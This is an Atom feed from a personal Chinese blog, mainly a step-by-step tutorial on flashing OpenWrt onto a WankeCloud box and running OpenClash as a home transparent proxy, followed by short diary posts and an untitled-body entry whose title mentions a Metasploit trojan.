<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hi, Lovely God</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lovek.me/"/>
  <updated>2021-02-10T13:23:04.405Z</updated>
  <id>https://lovek.me/</id>
  
  <author>
    <name>Lovely God</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>巧用矿渣玩客云，OpenClash透明代理</title>
    <link href="https://lovek.me/av2/"/>
    <id>https://lovek.me/av2/</id>
    <published>2021-02-09T06:47:12.000Z</published>
    <updated>2021-02-10T13:23:04.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="溯源"><a href="#溯源" class="headerlink" title="# 溯源"></a><span style="color:red"># </span>溯源</h2><p>家里的设备比较多，都安装代理比较麻烦，还有电视等等这些安装不了代理的设备，想直接在路由器上下手实现透明代理。之前尝试过给家里的WiFi刷固件，不过WiFi的CPU做这些事情显然有些吃力，网速衰减，每次过热都必须断电等它凉下来才能继续使用，不然会频繁断网，尤其是我不在家的时候家里没人会弄，很是不方便。更换高端WiFi价格昂贵，不想花太多钱在这个上面，感觉意义不大。<a id="more"></a>在B站 <del>看动漫</del> 吸收知识的时候，偶然看到有个UP主把玩客云刷成小服务器安装了Typecho博客。网上查了些资料这东西貌似还能刷成电视盒子或游戏盒子。我就想能不能刷成旁路由使用？就算刷不了也能充当个电视盒子备用，感觉稳赚不亏。</p><h2 id="需要的硬件"><a href="#需要的硬件" class="headerlink" title="# 需要的硬件"></a><span style="color:red"># </span>需要的硬件</h2><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/cs12.jpg" width="60%"><blockquote><p><strong><a href="https://taobao.com/" target="_blank"><span style="color:#fc6423">玩客云</span></a></strong><br><strong>配置：CPU：ARM 4核 1.5GHz，ROM：8GB</strong><br><strong>淘宝50元就能买到，但它的CPU是32位的，不过能用就行</strong></p><blockquote><p><strong><a href="https://pinduoduo.com/" target="_blank"><span style="color:#fc6423">双公头USB数据线</span></a></strong><br><strong>拼多多0.99元买的，质量还挺好</strong></p><blockquote><p><strong><span style="color:#fc6423">U盘</span></strong><br><strong>不会吧不会吧，你该不会连个备用U盘都没有吧</strong></p><blockquote><p><strong><span style="color:#fc6423">网线</span></strong><br><strong>家里WiFi送的网线</strong></p></blockquote></blockquote></blockquote></blockquote><p>全部下来只消费了<span style="color:red">50.99元</span>，价格还是很可观的</p><h2 id="用到的软件以及固件和插件"><a href="#用到的软件以及固件和插件" class="headerlink" title="# 用到的软件以及固件和插件"></a><span style="color:red"># </span>用到的软件以及固件和插件</h2><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/6251.PNG" width="60%"><blockquote><p><strong><span style="color:red"># </span>软件：</strong></p><blockquote><p><strong><a href="https://www.balena.io/etcher/" target="_blank"><span style="color:#fc6423">balenaEtcher</span></a></strong><br><strong>写入OpenWrt固件到U盘</strong></p><blockquote><p><strong><a href="https://wwa.lanzous.com/i0E7qlitoxa" target="_blank"><span style="color:#fc6423">USB_Burning_Tool</span></a></strong><br><strong>烧录Android固件到玩客云</strong></p><blockquote><p><strong><a href="https://wwa.lanzous.com/ir8Bflitnab" target="_blank"><span style="color:#fc6423">FinalShell</span></a></strong><br><strong>连接SSH终端</strong></p></blockquote></blockquote></blockquote></blockquote><blockquote><p><strong><span style="color:red"># </span>固件：</strong></p><blockquote><p><strong><a href="https://wwa.lanzous.com/ikvUUlitzdg" target="_blank"><span style="color:#fc6423">Android固件</span></a></strong><br><strong>烧录进玩客云</strong></p><blockquote><p><strong><a href="https://wwa.lanzous.com/iFLsgliu0ih" target="_blank"><span style="color:#fc6423">OpenWrt固件</span></a></strong><br><strong>写入U盘，之后刷入玩客云eMMC闪存</strong></p></blockquote></blockquote></blockquote><blockquote><p><strong><span style="color:red"># </span>OpenClash：</strong></p><blockquote><p><strong><a href="https://wwa.lanzous.com/iHNZpljuwli" target="_blank"><span style="color:#fc6423">Clash插件</span></a></strong><br><strong>加速上网</strong></p><blockquote><p><strong><a href="https://wwa.lanzous.com/i3zSHljuwtg" target="_blank"><span style="color:#fc6423">Clash内核</span></a></strong><br><strong>加速内核文件</strong></p></blockquote></blockquote></blockquote><h2 id="拆解玩客云烧录固件与U盘写入OpenWrt"><a href="#拆解玩客云烧录固件与U盘写入OpenWrt" class="headerlink" title="# 拆解玩客云烧录固件与U盘写入OpenWrt"></a><span style="color:red"># </span>拆解玩客云烧录固件与U盘写入OpenWrt</h2><p>用电吹风吹热玩客云的背面，之后用工具撬开第一层塑料壳<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/adcdsv.jpg" width="60%"></p><p>然后用螺丝刀拧掉这6颗螺丝，打开背壳抽出主板<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/0125736.jpg" width="60%"></p><p>拿出双公头USB线,一端连接玩客云，另一端连接电脑<br><span style="color:red">踩过的坑1：USB一定要插在玩客云靠近HDMI接口的那个USB上，然后另一头一定要插在笔记本后面不能插在侧边，主机的话插在机箱后面，不然会报错</span><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/20210210125930.jpg" width="60%"></p><p>将电脑与玩客云连接好后打开USB_Burning_Tool软件，选择flash_snail烧录包<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/acs.png" width="70%"></p><p>然后回到玩客云，需要短接一下主板上的那两个焊点。<br>这里不是很好操作，多试几次，先在玩客云没有通电的情况下，短接那两个焊点，之后再给玩客云通上电，这样才能进入玩客云的刷机模式<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/qqzxv.jpg" width="60%"></p><p>看到USB_Burning_Tool提示连接成功就可以了，没连接上说明没有短接好，多试几次<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/3.PNG" width="70%"></p><p>然后点击右边的开始，直接烧录即可，无需更改任何设置，这个过程大概持续30秒-2分钟，时间不会很长<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/1.PNG" width="70%"></p><p>烧录成功之后直接右上角X号关掉软件，然后把U盘插到电脑上<br>打开balenaEtcher，点击Flash from file直接选择openwrt.zip就行，压缩包解不解压都一样<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/4.PNG" width="70%"></p><p>然后点击Select target选择你的U盘，不要选错了<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/6.PNG" width="70%"></p><p>最后点击Flash等待写入完成<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/8.PNG" width="70%"></p><p>OK，烧录好了直接右上角X号关掉软件，注意，这里如果系统提示你格式化U盘记得点取消，不然你就白写了<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/11.PNG" width="70%"></p><p>最后给玩客云断电，拔掉USB线与电脑断开连接，插上网线，让玩客云可以连接到家里的WiFi，最后插上刚刚写好的U盘<br><span style="color:red">踩过的坑2：U盘一定要插在靠近网线接口的那个USB上，不然玩客云会读不出来</span><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/ebtnbdgf.jpg" width="70%"></p><h2 id="配置OpenWrt与WiFi-DHCP服务器"><a href="#配置OpenWrt与WiFi-DHCP服务器" class="headerlink" title="# 配置OpenWrt与WiFi DHCP服务器"></a><span style="color:red"># </span>配置OpenWrt与WiFi DHCP服务器</h2><p>插上网线和写好的U盘之后，给玩客云通上电，然后看网络接口，等待接口上的两个灯都亮起来后，打开wifi管理页面可以看到有一个叫做OneCloud的IP上线了<br><span style="color:red">踩过的坑3：如果玩客云的网络接口灯只亮一个，说明你的U盘插错USB口了。如果没有看到IP上线就尝试访问一下设备列表里的其他IP，看看哪一个可以访问到OpenWrt，也许设备上线之后不一定叫OneCloud，可能名字不一样也说不定呢</span><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/12.PNG" width="50%"></p><p>浏览器输入玩客云的IP访问到OpenWrt之后，输入<span style="color:red">用户名：root</span>与<span style="color:red">密码：snail</span>登录系统<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/13.PNG" width="70%"></p><p>这个界面太丑了，我们到系统属性的语言与界面里面吧主题改为Bootstrap保存并应用，方便下面的操作<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/14.PNG" width="70%"></p><p>然后到系统-管理权里面更改一下管理员密码保证安全<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/29.PNG" width="50%"><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/17.PNG" width="60%"><br>接着进入到网络-接口里面，可以看到四个接口，编辑一下LAN接口<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/sdvdv.PNG" width="50%"><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/30.PNG" width="70%"></p><p>将协议更改为静态地址并点击切换协议，之后只需要填写三个地方，第一个填写IPv4地址，第二个填写IPv4掩码，第三个填写IPv4网关</p><blockquote><p>IPv4地址：是指你的玩客云IP地址，因为我这里192.168.1.1与192.168.1.2都被占用了，所以我填写了192.168.1.3，随便填，只要不与其他设备的IP冲突就行，最小不要小于1，最大不要超过255</p></blockquote><blockquote><p>IPv4掩码：填写默认的就好，也就是255.255.255.0</p></blockquote><blockquote><p>IPv4网关：你的WiFi（主路由器）的IP，也就是你访问WiFi管理页面的那个IP地址，一般是192.168.1.1，按照网络环境填写就好，不过我的路由器是WDS无线桥接到另一个路由器上的，所以我的网关是192.168.1.2</p></blockquote><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/32.PNG" width="70%"><p>然后最下面还有一个DHCP服务器，一定要勾选上忽略次接口，不然会导致无法上网，最后点击应用并保存<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/33.PNG" width="70%"></p><p>然后这里需要等待一会，不要尝试刷新网页，之后会提示配置已回滚，记得点强制应用，就是那个红色按钮，别点错了<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/34.PNG" width="70%"></p><p>强制应用之后，等待一会，倒计时结束后可能不会出现配置已应用提示，这时直接关掉网页，然后访问你刚刚设置的IPv4地址。就可以再次访问到OpenWrt页面，输入<span style="color:red">用户名：root</span>和<span style="color:red">你刚刚设置的管理员密码</span>登录系统<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/28.PNG" width="70%"></p><p>回到WiFi管理页面，找到WiFi的DHCP服务器并启用，将网关、首选DNS服务器与备用DNS服务器这三个，都更改为你的玩客云IP，也就是你刚刚在OpenWrt里设置的IPv4地址，最后点击保存<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/35.PNG" width="70%"></p><p>断开你的WiFi连接，重新连接一下，然后浏览器随便访问一个网址试一下能不能访问到，如果这个时候WiFi还有网，说明配置的没有任何问题。如果这个时候WiFi无法上网了，说明OpenWrt-LAN接口里的IPv4网关填错了，或者是WiFi的网关、首选DNS服务器与备用DNS服务器没有填写对，逐一排查一下<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/vfdbg.PNG" width="50%"></p><p>上面的都配置好之后，现在的上网环境大概就变成了下图中的样子<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/aaaaaaaaac2.jpg" width="80%"></p><h2 id="将OpenWrt刷入玩客云eMMC闪存"><a href="#将OpenWrt刷入玩客云eMMC闪存" class="headerlink" title="# 将OpenWrt刷入玩客云eMMC闪存"></a><span style="color:red"># </span>将OpenWrt刷入玩客云eMMC闪存</h2><p>之后打开FinalShell软件，点击左上角的文件夹图标打开连接管理器窗口，在里面右键新建一个SSH连接<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/18.PNG" width="70%"></p><p>名称随意，主机填玩客云的IP，也就是刚刚设置的IPv4地址，端口默认22无需更改，认证方式选择密码，输入你登录OpenWrt的用户名与你设置的管理员密码，填完之后直接确定<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/19.PNG" width="70%"></p><p>右键你刚刚创建的SSH连接它，如果弹出是否接受该密钥，选择接受并保存就可以了，之后便进入到了玩客云OpenWrt的SSH终端<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/21.PNG" width="70%"></p><p>首先格式化一下eMMC闪存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh &#x2F;root&#x2F;format-emmc-partition.sh</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/23.PNG" width="70%"><p>然后将U盘里的OpenWrt刷入eMMC闪存，这个命令会清空BOOTFS与ROOTFS这两个系统分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh &#x2F;root&#x2F;install-openwrt-to-emmc.sh</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/25.PNG" width="70%"><p>看到 [ …. ] install finished，就表示刷入成功了，这个时候就可以关掉SSH终端，然后拔下玩客云的电源，再拔出U盘，U盘拔出之后重新给玩客云通上电就行了，因为OpenWrt已经刷到了玩客云的eMMC内存里，U盘已经不需要了<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/27.PNG" width="70%"></p><h2 id="安装OpenClash插件加速上网"><a href="#安装OpenClash插件加速上网" class="headerlink" title="# 安装OpenClash插件加速上网"></a><span style="color:red"># </span>安装OpenClash插件加速上网</h2><p>打开OpenWrt网络存储里面的文件传输，点击选择文件，吧Clash插件(Clash0.37.3.ipk)与Clash内核(Clash)上传到OpenWrt里面，可以看到，他们保存在/tmp/.filetransfer/目录下<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/58.PNG" width="60%"><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/38.PNG" width="70%"></p><p>再次打开FinalShell软件，连接上玩客云的OpenWrt SSH终端，切换到/tmp/.filetransfer/目录下，ls一下就可以看到刚刚上传的Clash插件与Clash内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F;.filetransfer&#x2F;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/40-2.PNG" width="70%"><p>然后将Clash0.37.3.ipk移动到/tmp/目录下，之后可以cd切换到/tmp目录下用ls看一下有没有成功移动过来，移动过来后，将clash插件强制安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv clash0<span class="number">.37</span><span class="number">.3</span>.ipk /tmp/.filetransfer/ /tmp/</span><br><span class="line"><span class="comment">#移动clash0.37.3.ipk到/tmp/目录下</span></span><br><span class="line">opkg install /tmp/clash0<span class="number">.37</span><span class="number">.3</span>.ipk  --force-depends</span><br><span class="line"><span class="comment">#强制安装clash插件</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/41.PNG" width="90%"><p>之后cd切换回/tmp/.filetransfer/目录下，ls看一下clash内核是否还在，然后将clash内核移动到/etc/openclash/core/目录下，这里会提示can’t remove ‘/etc/openclash/core/.filetransfer’: Is a directory，不过没关系，ls一下没看到文件就说明移动了，实在不放心cd再切换到/etc/openclash/core/目录然后ls看一下clash是不是在里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv clash &#x2F;tmp&#x2F;.filetransfer&#x2F; &#x2F;etc&#x2F;openclash&#x2F;core&#x2F;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/44.PNG" width="90%"><p>最后关掉FinalShell，Ctrl+F5刷新一下OpenWrt的浏览器页面，然后就可以在服务里看到Openclash选项<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/42.PNG" width="80%"></p><p>点击clash的全局设置-模式设置，更改页面操作模式为Fake-IP模式，启用UDP流量转发，然后点击切换操作模式<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/47.PNG" width="70%"></p><p>之后切换到基本设置里面，内核编译版本选择Linux-armv7，然后点击最下面的应用配置保存一下<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/48.PNG" width="70%"></p><p>最后切换到配置文件管理页面，上传你的yaml配置文件，上传成功之后点一下切换，启用这个配置文件<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/45.PNG" width="60%"><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/46.PNG" width="70%"></p><p>回到运行状态页面，点击启动Openclash，之后等待clash配置完毕后刷新一下网页，没有看到任何红色则表示已经配置好了，上面提示让我们关闭IPv6 DHCP服务，经过测试，其实这个关不关都无所谓，无影响，如果你是完美主义者，可以去编辑LAN接口里面的DHCP服务器下的IPv6设置，将DHCPv6服务设置为禁用，就不会出现这个提示了<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/49.PNG" width="60%"><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/50.PNG" width="60%"></p><p>然后到全局设置里的仪表盘设置下，修改一下clash的监听端口与clash的管理页面登录密钥，保证安全<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/53.PNG" width="70%"></p><p>最后回到clash运行状态页，打开Dashboard控制面板，输入Host与端口和密钥</p><blockquote><p>Host：填玩客云的IP地址，也就是之前在LAN接口设置的IPv4地址</p></blockquote><blockquote><p>端口：填刚刚在仪表盘设置的clash监听端口</p></blockquote><blockquote><p>密钥：填刚刚在仪表盘设置的clash管理页面登录密钥</p></blockquote><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/54.PNG" width="70%"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/55.PNG" width="70%"><p>然后回到clash运行状态页，打开Yacd控制面板，如果看到流量有上传和下载，就表示当前网络已经处于加速状态了<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/52.PNG" width="70%"></p><p>点击Proxies，在这里可以切换你的加速服务器，选择一个最快的服务器就好<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/56.PNG" width="70%"></p><p>到这里就可以了，吧需要加速的设备连上这个WiFi，就可以实现不挂代理加速了</p><h2 id="结尾补充"><a href="#结尾补充" class="headerlink" title="# 结尾补充"></a><span style="color:red"># </span>结尾补充</h2><p>有时候家里可能有人需要加速上网，也有人不需要，这时候就需要两个WiFi信号了，可以单独再弄一个WiFi，WDS无限桥接到主WiFi上，玩客云旁路由连接到第二个WiFi上，主WiFi正常使用，第二个WiFi走旁路由，可以灵活运用，代理与正常随意切换<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/asdvf.jpg" width="80%"></p><h2 id="安装一个主题"><a href="#安装一个主题" class="headerlink" title="# 安装一个主题"></a><span style="color:red"># </span>安装一个主题</h2><p>到系统-软件包-OPKG配置里面找到自定义软件源，吧下面的软件源填进去并提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">src&#x2F;gz openwrt_core http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;lede&#x2F;releases&#x2F;18.06.4&#x2F;targets&#x2F;x86&#x2F;64&#x2F;packages</span><br><span class="line">src&#x2F;gz openwrt_base http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;lede&#x2F;releases&#x2F;18.06.4&#x2F;packages&#x2F;x86_64&#x2F;base</span><br><span class="line">src&#x2F;gz openwrt_luci http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;lede&#x2F;releases&#x2F;18.06.4&#x2F;packages&#x2F;x86_64&#x2F;luci</span><br><span class="line">src&#x2F;gz openwrt_packages http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;lede&#x2F;releases&#x2F;18.06.4&#x2F;packages&#x2F;x86_64&#x2F;packages</span><br><span class="line">src&#x2F;gz openwrt_routing http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;lede&#x2F;releases&#x2F;18.06.4&#x2F;packages&#x2F;x86_64&#x2F;routing</span><br><span class="line">src&#x2F;gz openwrt_telephony http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;lede&#x2F;releases&#x2F;18.06.4&#x2F;packages&#x2F;x86_64&#x2F;telephony</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/ascj.PNG" width="90%"><p>回到软件包-动作页面刷新列表，就会加载提交的软件源了<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/vkv.PNG" width="70%"><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/dkl.PNG" width="70%"></p><p>然后下面选择L，在列表里找到luci-theme-material（从下往上找比较快）<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/mclj.PNG" width="70%"><br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/acssca.PNG" width="70%"></p><p>点击右边的安装就行了，玩客云的CPU是32位的，不要随便安装一些奇奇怪怪的主题，不然容易后台无法访问<br><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/PicGo/img/okokok.PNG" width="70%"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;溯源&quot;&gt;&lt;a href=&quot;#溯源&quot; class=&quot;headerlink&quot; title=&quot;# 溯源&quot;&gt;&lt;/a&gt;&lt;span style=&quot;color:red&quot;&gt;# &lt;/span&gt;溯源&lt;/h2&gt;&lt;p&gt;家里的设备比较多，都安装代理比较麻烦，还有电视等等这些安装不了代理的设备，想直接在路由器上下手实现透明代理。之前尝试过给家里的WiFi刷固件，不过WiFi的CPU做这些事情显然有些吃力，网速衰减，每次过热都必须断电等它凉下来才能继续使用，不然会频繁断网，尤其是我不在家的时候家里没人会弄，很是不方便。更换高端WiFi价格昂贵，不想花太多钱在这个上面，感觉意义不大。
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>现在可以订阅博客了！</title>
    <link href="https://lovek.me/av10/"/>
    <id>https://lovek.me/av10/</id>
    <published>2020-01-24T03:59:03.000Z</published>
    <updated>2020-01-26T09:45:38.370Z</updated>
    
    <content type="html"><![CDATA[<ul><li>博客已开通Email邮箱订阅功能，小可爱们现在可以随时捕捉到Lovely God的动态了！</li><li><a href="http://eepurl.com/gQlA05" target="_blank" rel="noopener">订阅 Hi, Lovely God</a>（推荐使用<a href="https://www.google.cn/intl/zh-CN/chrome/" target="_blank" rel="noopener">Chrome浏览器</a>订阅博客）</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.5/dywj/dy/2.png"><a id="more"></a><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.5/dywj/dy/1.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.5/dywj/dy/3.png">]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;博客已开通Email邮箱订阅功能，小可爱们现在可以随时捕捉到Lovely God的动态了！&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://eepurl.com/gQlA05&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;订阅 Hi, Lovely God&lt;/a&gt;（推荐使用&lt;a href=&quot;https://www.google.cn/intl/zh-CN/chrome/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Chrome浏览器&lt;/a&gt;订阅博客）&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.5/dywj/dy/2.png&quot;&gt;
    
    </summary>
    
    
      <category term="日记本" scheme="https://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>博客搬家至GitHub,更换为Hexo框架</title>
    <link href="https://lovek.me/av9/"/>
    <id>https://lovek.me/av9/</id>
    <published>2020-01-22T16:27:20.000Z</published>
    <updated>2020-09-27T08:31:05.492Z</updated>
    
    <content type="html"><![CDATA[<ul>    <li>博客离开简洁的<a href="http://typecho.org/" target="_blank" rel="noopener">Typecho</a>花了5天时间，现在博客由<a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>强力驱动，这5天基本没怎么睡觉好累(つω｀)～</li>    <br>    <img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.4/dywj/bqhexo/1.png">    <a id="more"></a>    <br>    <li><a href="https://studio.dev.tencent.com/" target="_blank" rel="noopener">腾讯云开发者平台|cloud studio</a>1月21日下午3点20分突然进行升级操作令我丢了整个仓库的数据，最后折腾了一番，<a href="https://coding.net/products/cloudstudio" target="_blank" rel="noopener">新版CODING</a>界面不熟悉而且还很卡，上传、下载数据也慢的要死，Hexo还没下载完，突然提醒限制每天只能使用两小时...（气死我了！！！o(￣ヘ￣o＃)）</li>    <br>    <img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.4/dywj/bqhexo/2.png">    <br>    <li>最后只好改用本地环境搭建Hexo重新开始，心情不可描述...</li>    <li>博客离开了<a href="https://www.huaweicloud.com/" target="_blank" rel="noopener">华为云服务器</a>，转移至<a href="https://github.com" target="_blank" rel="noopener">GitHub</a>托管，感谢华为云这段时间的收留.（づ￣3￣）づ╭❤～</li>    <br>    <img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.4/dywj/bqhexo/3.png">    <br>    <li>终于可以吧买服务器的钱省下来吃旋转小火锅了~好激动~</li>    <li>马上要过年了，祝大家新年快乐</li>    <br>    <!-- <li>我想听手机收到压岁钱的提示音，有缘的小可爱现在可以<a href="https://cdn.jsdelivr.net/gh/cheng2924070927/Blog@v1.0.1/zswx.jpg" target="_blank" rel="noopener">向我转账</a>(*/ω＼*)害羞~</li> -->    <li><del>现在是晚上3点05分</del>，不，已经算是第二天早上3点了</li>    <li>坐在电脑面前冻得瑟瑟发抖的卑微Lovely God要去睡觉了，小可爱们晚安</li>    <br>    <li>对了，今后不要再喊我打游戏了，我是不会告诉你们我已经吧所有的游戏都<s>安装上了</s>卸载掉了(o゜▽゜)o☆</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
    &lt;li&gt;博客离开简洁的&lt;a href=&quot;http://typecho.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Typecho&lt;/a&gt;花了5天时间，现在博客由&lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;强力驱动，这5天基本没怎么睡觉好累(つω｀)～&lt;/li&gt;
    &lt;br&gt;
    &lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.4/dywj/bqhexo/1.png&quot;&gt;
    
    </summary>
    
    
      <category term="日记本" scheme="https://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>100天成就达成！</title>
    <link href="https://lovek.me/av8/"/>
    <id>https://lovek.me/av8/</id>
    <published>2019-12-24T11:11:00.000Z</published>
    <updated>2020-09-27T08:32:18.129Z</updated>
    
    <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/100.jpg"><ul><li>正好赶上今年的平安夜，提前祝大家圣诞节快乐！(๑•̀ㅂ•́)و✧<a id="more"></a><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/sd.jpg"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/100.jpg&quot;&gt;

&lt;ul&gt;
&lt;li&gt;正好赶上今年的平安夜，提前祝大家圣诞节快乐！(๑•̀ㅂ•́)و✧
    
    </summary>
    
    
      <category term="日记本" scheme="https://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>Kali Linux利用metasploit生成木马入侵Windows系统</title>
    <link href="https://lovek.me/av7/"/>
    <id>https://lovek.me/av7/</id>
    <published>2019-12-12T15:47:00.000Z</published>
    <updated>2020-03-14T16:42:01.684Z</updated>
    
